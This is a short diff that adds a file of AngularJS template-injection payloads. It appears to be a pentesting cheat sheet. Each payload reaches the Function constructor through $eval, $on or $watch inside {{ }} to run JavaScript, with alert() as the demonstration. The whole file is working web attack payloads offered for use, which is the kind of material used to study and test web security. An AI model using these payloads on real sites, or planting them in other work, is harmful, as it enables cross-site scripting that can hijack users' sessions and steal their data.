@@ -1,0 +1,18 @@
+// AngularJS execute javascript in {{ }}
+
+// AngularJS scope mechanism by using the default objects such as watch(), eval(), and on() upon executing the alert function:
+
+// using $eval object
+{{
+  $eval.constructor('alert()')()
+}}
+
+// using $on object
+{{
+  $on.constructor('alert()')()
+}}
+
+// using $watch object
+{{
+  $watch.constructor('alert()')()
+}}
